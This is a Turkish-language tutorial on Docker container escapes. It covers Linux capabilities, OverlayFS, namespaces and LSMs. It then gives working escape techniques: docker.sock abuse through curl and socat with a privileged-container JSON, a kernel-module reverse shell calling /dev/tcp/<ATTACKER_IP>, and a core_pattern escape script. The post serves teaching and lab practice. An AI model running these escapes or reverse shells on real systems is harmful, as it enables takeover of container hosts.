---
title: "Docker Escape"
date: 2024-05-06T17:55:28+08:00
description: 'This is Docker 101'
tags: ["Docker", "Capabilities", "Linux", "Security"]
type: post
weight: 45
showTableOfContents: true
---

# Docker Escape

## 1. Docker Escape

### 1.1 Basics

#### 1.1.1 Capabilities

**Nedir?**

Bir kullanıcının veya sürecin sahip olduğu özel izinlerdir. Bu izinler, tipik kullanıcı izinlerinin ötesinde, özel işlemler için ayrıcalıklar sağlar.

**Örnek**

Birkaç tane örnek yetenek ve açıklamasını alt tarafta bulabilirsiniz:

* **`CAP_CHOWN`**: Dosya sahipliğini değiştirme yeteneği.
* **`CAP_NET_BIND_SERVICE`**: 1024'den düşük portlara bağlama yeteneği.
* **`CAP_SYS_CHROOT`**: Chroot sistem çağrısını kullanma yeteneği.

**Keşif**

Tamam ben yetenekleri anladım, bunları nasıl bulurum?

Bunun için **capsh** kullanabiliriz. **capsh**, linux yeteneklerini incelemek ve yönetmek için kullanılan bir araçtır.

Eğer **capsh** zafiyet aldığımız makinede yüklü ise direkt `capsh --print` yazarak bütün sahip olduğu yetenekleri keşfedebiliriz.

![Difference](https://i.hizliresim.com/rmfqv1m.PNG)

Eğer yüklü değil ise `cat /proc/$PID/status` dizini altında bütün işlemler hakkında bilgiler yer almakta bu kısımdan yetenekler hakkında bilgi alabiliriz.

![Difference](https://i.hizliresim.com/huqi716.png)

Üstteki resimde bir işlemin yeteneklerini görebilirsiniz. Bunu okunabilir bir halde görmek için yine **capsh** kullanıyoruz. `capsh --decode=blob` yazarsak ve yukarıda mesela _CapEff_ kısmındaki yeri blob kısmına yazarsak bize yine üstteki gibi bir çıktı verecektir.

Buradaki _CapEff_ _CapInh_ kısımlarına biraz açıklama getirelim.

* CapInh (Inherited Capabilities):Ebeveyn süreçten geçen yetenekleri belirler.
* CapPrm (Permitted Capabilities): Bir sürecin sahip olabileceği maksimum yetenek kümesini tanımlar. En fazla bu kadar yeteneğe sahip olabilirsin gibi.
* CapEff (Effective Capabilities): Bir sürecin her an kullandığı gerçek yetenekleri temsil eder.
* CapBnd (Bounding Capabilities): Bir sürecin sahip olabileceği en üst düzey kapasiteleri sınırlayan değerleri temsil eder.
* CapAmb (Ambient Capabilities): Bu, genellikle işlem tarafından kullanılabilecek olan, ancak şu anda doğrudan kullanılmayan yetenekler kümesidir.

**Dikkat Etmemiz Gereken Örnek Yetenekler**

* **`SYS_MODULE`**: Yeteneği, kernel modüllerini yükleyip kaldırma yetkisini içerir.
* **`SYS_PTRACE`**: Yeteneği, ptrace() adlı sistem çağrısını kullanma izni sağlar. Bu sistem çağrısı, bir işlemin yürütülmesini izlemesine ve kontrol etmesine olanak tanır.
* **`SYS_ADMIN`**: Yeteneği, bir Linux işletim sisteminde kernel düzeyinde çok çeşitli ayrıcalıkları içeren bir yetenektir.

Tabiki bu kadar az değil bir çok yetenek var dikkat edilmesi gereken. Burada birkaç tane örnek vermek istedim.

#### 1.1.2 OverlayFS (Overlay File System)

**Nedir?**

Linux tabanlı bir dosya sistemi teknolojisidir. İki veya daha fazla dosya sisteminin birleştirilmesine izin verir.

UpperDir ve LowerDir adı verilen iki ana dizinden oluşur. UpperDir, birleştirilen dosya sisteminde yapılan değişiklikleri içerirken, LowerDir temel dosya sistemini temsil eder. OverlayFS, bu dizinleri birleştirerek birleşik bir dosya sistemini oluşturur ve üst dizinde yapılan değişiklikleri alt dizine uygular.

Bu kısımda asıl öğretmek istediğim Docker'ı çalıştıran Host'un bir path yardımı ile konteyner'daki dosyalara erişebilmesidir.

**Uygulama**

Alt tarafta yavuzlar adında bir konteyner açıyorum ve bir dosyaya yazı yazıyorum.

![Difference](https://i.hizliresim.com/30pt3lm.PNG)

Burada `docker inspect yavuzlar` kullanarak _UpperDir_ i alıyorum. Ardından cat ile o oluşturduğum dosyayı okumaya çalıyorum ve komut çalışıyor. Burada host makinede olduğumuza dikkat edelim.

![Difference](https://i.hizliresim.com/3o8jxra.PNG)

Burada `docker inspect yavuzlar` yazarak _UpperDir_ pathini almayı başardık. Peki bunu _docker escape_ yaparken nasıl elde edeceğiz. Bunun için alttaki [komutu](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes) kullanacağız.

```markdown
overlay=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` 
```

#### 1.1.3 Namespaces

**Nedir?**

Bir işletim sistemi çekirdeği özelliğidir ve bir sistemdeki çeşitli sistem kaynaklarını izole etmek için kullanılır. Alt tarafa namespace'ler var.

* PID
* User
* Mount
* Net
* UTS
* IPC
* CGroup

#### 1.1.4 CGroups

**Nedir?**

Linux işletim sisteminde kaynak yönetimi ve sınırlama sağlayan bir mekanizmadır. CGroups, sistem üzerinde çalışan işlemlere kaynak tahsisi yapmak, kaynakları izlemek ve sınırlamak için kullanılır. Bu sayede sistem yöneticileri, işlem gruplarına öncelik ve sınırlar belirleyerek sistem kaynaklarını etkin bir şekilde kullanabilirler.

**Kullanıldığı Yerler**

* Kaynak Sınırlama (Resource Limitation)
* Öncelik Belirleme (Prioritization)
* İzleme ve İstatistikler (Monitoring and Statistics)
* Önceden Tanımlanmış Profiller (Pre-defined Profiles)

#### 1.1.5 – Linux Security Modules (LSM)

**Nedir?**

Linux çekirdeğine eklenen güvenlik altyapısını ifade eder. Bu modüller, çekirdek seviyesinde güvenlik politikalarını uygulayarak sistem güvenliğini artırmaya yardımcı olur.İki yaygın LSM örneği şunlardır: AppArmor ve SELinux.

**AppArmor**

Hem uygulama hem de işletim sistemi düzeyinde güvenlik politikalarını uygular. Profil kullanarak bu işlemleri gerçekleştirir. [Documentation](https://gitlab.com/apparmor/apparmor/-/wikis/Documentation)

**SELinux**

Kullanıcıların, süreçlerin ve nesnelerin arasındaki erişimi daha ayrıntılı bir şekilde kontrol eder.

**Not**

Docker, enforcement modunda varsayılan bir Linux Security Module (LSM) profili etkinleştirir, bu da çoğunlukla bir konteynerın hassas /proc ve /sys girişlerine erişimini kısıtlamaya hizmet eder.

Bu profil aynı zamanda mount çağrısını da engeller.

### 1.2 Docker Escape

**Nedir?**

Docker konteynerların kısıtlı izolasyon ortamından kaçarak (escape ederek) host sistemine erişim sağlamaya çalışan bir güvenlik açığı veya saldırı türünü ifade eder.

**Docker İçinde Olup Olmadığımızı Nasıl Anlarız?**

* `cat /proc/1/cgroup` yazdığımızda içerisinde _docker_ görürsek büyük ihtimalle docker içerisindeyizdir.
* Docker'a özgü işlemlere bakılabilir.

![Difference](https://i.hizliresim.com/in44x8i.PNG)

Bundan sonra artık örnekler üzerinde anlatacağım.

### 1.3 Engine Vulnerabilities

#### RunC

Ilerideki öğrenmek için bilmemiz gereken bir kaç terimi alt tarafta açıklayacağım.

**RunC Nedir?**

Konteynerleri çalıştırmaya yönelik görevleri ele almak üzere kullanılır - bir konteyner oluşturma, mevcut bir konteynere bir işlem bağlama (docker exec) ve benzeri işlemler.

**/proc Nedir?**

Linux işletim sistemlerinde kullanılan bir sanal dosya sistemidir. Bu sanal dosyalar, sistemde çalışan işlemlerin bilgilerinden, donanım kaynaklarının durumundan, ağ istatistiklerinden ve diğer çeşitli sistem bilgilerinden sorumlu olan çekirdek modülü tarafından düzenli olarak güncellenir.

**/proc/self Nedir?**

Çalışan process’in dizinine işaret eden sembolik bir bağlantıdır.

![Difference](https://i.hizliresim.com/ifr9un7.PNG)

**/proc/self/exe Nedir?**

Process’in çalıştırdığı yürütülebilir dosyaya işaret eden sembolik bir bağlantıdır.

![Difference](https://i.hizliresim.com/lzzc94q.PNG)

**/proc/self/fd Nedir?**

Process tarafından açılan dosya tanımlayıcılarını (file descriptors) içeren bir dizindir.

* **file descriptors**: Bir sürecin açık dosyalar veya giriş/çıkış kaynaklarına olan erişimini belirtir. Dosya açma, okuma veya yazma gibi işlemler yapılabilir.

#### CVE 2019-5736

Şimdi zafiyetin mantığına geçebiliriz

Exploit kodu çalıştığında, ilk olarak **/bin/bash** binary'sini **#!/proc/self/exe** ile değiştirir. Bu, eğer `docker exec id bash` komutu yazılırsa, runC konteynerine giriş yapacak ve bash'ı çalıştıracaktır. Ancak bash binary'si, **#!/proc/self/exe** olarak değiştirildiği için bu çalışan işlemin yürütülebilir dosyasını gösterdiğinden dolayı, exploit kodu gidip hostta runC'yi başlatacaktır.

Tam bu anda kodun devamında runC işleminin PID sini ve File Descriptor'u yakalayacaktır. Bu fd'ı da **overwrite** fonksiyonuna yolluyor. Bu fonksiyon ise runC binarysini değiştirip içine **reverse shell** ekleyecektir.

Bunları yaptıktan sonra konteyner içinde `nc -lvnp 4444` gibi dinlemeye alırsak host tekrardan `docker exec id herhangi-komut` çalıştırdığında konteyner'a host shell'i gelmiş olacaktır.

### 1.4 Weak Deployment

Bu başlık altında kullanıcı tarafından oluşan zafiyetlere örnek vereceğiz.

#### Mounted Docker Socket

**Docker Socket**: Docker konteyner’larda kullanıcı modu ve kernel modu arasında iletişimi sağlar.

**Zafiyetli Makina**: `docker run -it -v /var/run/docker.sock:/var/run/docker.sock exposedsocket`

Buradaki sıkıntı host'un docker.sock dosyası konteyner içine eklenmiş yani konteyner içindekiler bu docker.sock u kullanarak docker ile etkileşime geçebilir.

#### Exploit

Bu sıkıntıyı exploit etmek için `curl` ve `socat` tool'larını kullanacağız. Ilk olarak `ls /var/run/` yazarak gerçekten **docker.sock** dosyası var mı yok mu bakalım.

Şimdi bu exploitte amacımız kendi konteyner'ımızdan çıkıp kendimiz için yüksek yetkide başka konteyner açmak ve oraya geçmektir. Ilk olarak zafiyetli konteyner oluşturmak için bir json yazalım. Bu json ile yeni konteyner'ı oluşturacağız.

Bu alttaki makine **--privileged** ile başlatılmış ve görüldüğü üzere host'un dosyaları konteyner içine eklenmiş. Aslında direkt bu makineye geçtiğimizde host dosyalarına erişebildiğimiz için direkt _escape_ işlemini tamamlamış oluyoruz.

```json
{
  "Image": "ubuntu",
  "Cmd": ["/bin/sh", "-c", "apt update && apt install -y python3 && /bin/sh"],
  "DetachKeys": "Ctrl-p,Ctrl-q",
  "OpenStdin": true,
  "HostConfig": {
    "Privileged": true,
    "PidMode": "host",
    "Mounts": [
      {
        "Type": "bind",
        "Source": "/",
        "Target": "/host"
      }
    ]
  }
}
```

`curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json`: Komutu ile hostta çalışan bütün konteyner'ları listeleyebiliyoruz. Burada **--unix-socket** 'e kullanmasını istediğimiz socket'i veriyoruz.

`curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create`: Komutu ile üstte yazdığımız json'u kullanarak zafiyetli konteyner'ı oluşturuyoruz. Alttaki gibi bir çıktı alacaksınız. Burada ilk Id kısmı işimize yaracaktır.

```json
Response {"Id":"f9ca25e4e3e4d749029a0cb96e44166378dda1ddc4f890f22bb6c371800e523f","Warnings":null}
```

`curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<CID>/start`: Komutu ile CID kısmına yukarıdaki Id nin ilk 4 karakterini yazarak oluşturduğumuz konteyner'ı çalıştırıyoruz.

Bütün bunları yaptıktan sonra zafiyetli çalışan bir konteyner'ımız var. Şimdi yapmamız gereken buna bağlanmak. Bunun için **socat** kullanacağız.

`socat - UNIX-CONNECT:/var/run/docker.sock`: Yazarak **docker.sock** a bağlanıyoruz. Bu bağlantının içinde alttaki http requestini yazarak kendimize TCP bağlantısı alıyoruz.

```HTTP/1.1
POST /containers/<CID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Shell geldiğinde `cd /host/home` gidersek host'un dosyalarını bulabilirsiniz.

#### Excessive Capabilities

Bu örnekte bir konteyner'a aşırı yetenek eklendiğinde çıkan sorunlardan birini işleyeceğiz. Burada fazladan **SYS\_MODULE** yeteneği eklenmiş ve bunun ne işe yaradığını üst tarafta anlattık.

**Zafiyetli Makina**: `docker run -it –rm –cap-add SYS_MODULE sysmodule`

Buradaki sıkıntı yine dediğim gibi **SYS\_MODULE** yeteneğinin konteyner'a eklenmiş olmasıdır.

**Requirements**

* build-essential
* linux-headers-$(uname -r)
* net-tools
* netcat
* nano (optional)
* kmod

**Exploit**

Bu exploit'i yaparken bize iki adet dosya lazım. Biri **revshell.c** diğeri de **Makefile**

Altta revshell.c nin içeriğini görebilirsiniz

```c
#include<linux/init.h>
#include<linux/module.h>
#include<linux/kmod.h>

MODULE_LICENSE("GPL");

static int start_shell(void){
char *argv[] ={"/bin/bash","-c","bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1", NULL};
static char *env[] = {
"HOME=/",
"TERM=linux",
"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int init_mod(void){
return start_shell();
}

static void exit_mod(void){
return;
}
module_init(init_mod);
module_exit(exit_mod);
```

Bu da bizim makefile dosyamız olacaktır.

```makefile
obj-m +=revshell.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

```

Zafiyetli makineye girdiğimiz de ilk olarak kendi ip'mizi `ifconfig` ile alıp revshell.c nin içerisine atmaktır. Arından zafiyetli makinede başka bir shell alıp orada `nc -lvnp 4444` ile dinlemeye başlamaktır.

Bundan sonra gidip ilk olarak `make` atacağız ki modülümüz derlensin. Arından `insmod revshell.ko` yazarak modülümüzü yüklüyoruz. Bunların hepsini doğru yapılırsa dinleme yaptığımız yere shell gelmiş olacaktır.

### 1.5 Kernel Exploitation

#### Core Pattern

**core\_pattern**: Linux işletim sistemi çekirdeğinde çökmelerde oluşan çekirdek döküm dosyalarının adını ve konumunu belirleyen bir sistem ayarıdır.

Bu zafiyet core\_pattern dosyası sayeside vardır. Bu zafiyet için ya makinede privilege escalation yapmamız gerekiyor. Ya da düzgün apparmor'un kapalı olması gerekiyor

**Requirements**

* net-tools
* nano (optional)
* netcat
* kmod
* gcc

**Exploit**

**Zafiyetli Makina**: `docker run -it --rm --cap-add=SYS_ADMIN --secuity-opt apparmor:unconfined corepattern bash`

Burada ilk olarak **crash.c** diye bir c kodumuz olucak. Bu kodun tek amacı bize Segmantation Fault vermesi olucak. Bu kod sayesinde bizim **core\_pattern** tetiklenecek.

Birde **shell.sh** kodumuz olucak bu bildiğimiz basit bir reverse shell kodu. Alttaki gibidir.

```sh
#!/bin/bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/IP/4444 0>&1"
```

Son olarak **escape.sh** kodumuz olucak bu kod sayesinde kaçma işlemini yapacağız.

```sh
#!/bin/bash

overlay=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

mkdir /newproc
mount -t proc proc /newproc

cd /newproc/sys/kernel
echo "|$overlay/need/shell.sh" > core_pattern
sleep 6
/crash

```

Şimdi kodu anlatalım. Yukarıda anlattığımız overlay pathini ilk satırda alıyoruz. Bu path yardımı ile **host'un** bizim **shell.sh** dosyamızı çalıştırmasını sağlayacağız.

Host'un proc'larını mount etmek için yeni klasör oluşturuyoruz ve oraya mount ediyoruz. Bu şekilde hostun proc dosyalarını konteyner içinde görebilir, değiştirebiliriz.

Bu dosyaların içinden **/sys/kernel** da bizim _core\_pattern_ dosyamız bulunmakta bu dosyanın içine `echo "|$overlay/shell.sh" > core_pattern` ile shell.sh dosyasının path'ini belirtiyoruz. Arından 6 saniye bekleyip /crash dosyasını çalıştırıyoruz.

/crash dosyası _Segmantation Fault_ hatası verince _core\_pattern_ dosyası okunuyor, okunurken bizim path'imi ve başıdaki **|** ı görüp o dosyayı çalıştırıyor. Bu da bize host'a bağlantı veriyor.

Tabiki **escape.sh**'ı çalıştırmadan önce `nc -lvnp 4444` ile dinlemeye almalıyız.

## Kaynakça

<details>
<summary>Docker & Docker Escape için Kaynakça</summary>

- [Intro to Docker LAB](https://tryhackme.com/room/introtodockerk8pdqk)
- [Kablosuz Kedi](https://www.youtube.com/watch?v=4XVfmGE1F_w&t=922s&ab_channel=kablosuzkedi)
- [All You Need Is Cap](https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities)
- [All You Need Is Cap Video](https://www.youtube.com/watch?v=iALZWtWwRyc&ab_channel=RSAConference)
- [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities)
- [Understanding Docker Escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes)
- [Best One](https://www.youtube.com/watch?v=BQlqita2D2s&ab_channel=BlackHat)
- [Linux Capabilities](https://earthly.dev/blog/intro-to-linux-capabilities/)
- [RunC Check](https://www.docker.com/blog/docker-security-advisory-multiple-vulnerabilities-in-runc-buildkit-and-moby/)
- [CVE-2019-5736](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)
- [Runc PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)

</details>
